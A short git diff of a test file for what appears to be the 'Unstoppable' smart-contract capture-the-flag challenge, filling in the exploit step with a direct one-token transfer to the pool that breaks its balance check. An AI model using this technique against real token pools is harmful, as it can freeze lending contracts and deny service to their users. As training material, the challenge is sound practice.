@@ -40,6 +40,8 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Transfer tokens to pool contract via erc20 Transfer to trigger a mismatch in pool balance
+        this.token.connect(attacker).transfer(this.pool.address, 1); 
     });
 
     after(async function () {
